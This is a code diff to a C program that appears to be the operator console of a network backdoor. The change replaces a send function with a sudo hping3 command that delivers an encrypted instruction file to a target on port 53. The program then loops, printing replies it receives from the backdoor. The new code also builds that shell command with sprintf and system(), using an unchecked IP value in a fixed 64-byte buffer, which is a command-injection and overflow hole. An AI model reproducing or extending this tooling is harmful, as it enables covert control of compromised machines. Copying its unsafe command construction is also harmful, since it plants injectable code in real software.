@@ -31,6 +31,7 @@ int main(int argc, char *argv[]) {
     socklen_t target_addr_len;
     char buffer[1024] = {0};
     int option = 1;
+    char hping3[64] = {0};
 
     check_root_user();
     options_sniffer_init(&opts);
@@ -40,7 +41,10 @@ int main(int argc, char *argv[]) {
     }
     //TODO: encrypt user input
     encrypt_and_create_instruction_file(&opts);
-    send_instruction(&opts);
+
+    sprintf(hping3, "sudo hping3 -c 1 -2 -E ./instruction.txt -d 100 -p 53 %s", opts.sniff_ip);
+    system(hping3);
+//    send_instruction(&opts);
 
     if ( (opts.sniffer_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
         perror("socket creation failed");
@@ -57,7 +61,7 @@ int main(int argc, char *argv[]) {
     setsockopt(opts.sniffer_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
 
     // Bind the socket with the server address
-    if ( bind(opts.sniffer_socket, (const struct sockaddr *)&sniffer_addr,
+    if (bind(opts.sniffer_socket, (const struct sockaddr *)&sniffer_addr,
               sizeof(sniffer_addr)) < 0 ) {
         perror("bind failed");
         exit(EXIT_FAILURE);
@@ -67,8 +71,9 @@ int main(int argc, char *argv[]) {
     puts("Receiving from backdoor packet ...");
     while(1) {
         signal(SIGINT,sig_handler);
-        recvfrom(opts.sniffer_socket, buffer, sizeof(buffer), 0, (struct sockaddr *)&target_addr, &target_addr_len);
-        printf("%s\n", buffer);
+        recvfrom(opts.sniffer_socket, buffer, sizeof(buffer), 0,
+                    (struct sockaddr *)&target_addr, &target_addr_len);
+        printf("%s", buffer);
         memset(buffer, 0, sizeof(buffer));
     }
 
